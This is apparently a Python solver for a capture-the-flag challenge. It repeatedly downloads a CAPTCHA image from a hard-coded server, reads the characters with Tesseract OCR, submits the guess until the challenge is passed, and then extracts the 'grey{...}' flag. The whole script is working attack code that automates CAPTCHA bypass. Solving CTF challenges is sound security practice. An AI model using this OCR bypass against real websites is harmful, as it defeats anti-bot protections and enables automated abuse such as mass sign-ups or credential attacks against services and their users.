# Requires:
# pip install pytesseract
# Clone & make https://github.com/tesseract-ocr/tesseract/

from PIL import Image
from requests import Session
from io import BytesIO
from base64 import b64decode
import pytesseract
import re
from string import ascii_uppercase

URL = "http://34.124.157.94:5003/"
SUBMIT_URL = URL + "/submit"
pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"


def read_b64_img_as_str(im_b64: str) -> str:
    """Reads a base64 image and returns the text in the image as a string"""
    # Greyscale the image
    with Image.open(BytesIO(b64decode(im_b64))) as img:
        # Convert the image to string
        return pytesseract.image_to_string(
            img,
            nice=1,
            config=f"-c tessedit_char_whitelist={''.join(ascii_uppercase)}"
        ).strip()[:4]


with Session() as s:
    resp = s.get(URL)
    content = resp.content.decode()

    while '102' not in content:
        # Get the image and recognise the characters.
        im_b64 = re.search(
            r'src="data:image/jpeg;base64,(.*?)"',
            content,
        ).group(1)

        # Send form data with the captcha
        resp = s.post(
            SUBMIT_URL,
            data={"captcha": read_b64_img_as_str(im_b64)}
        )
        content = resp.content.decode()

    flag = re.search(r"grey{.*?}", content)
    if flag is None:
        print(content)
    else:
        print("Flag:", flag.group(0))
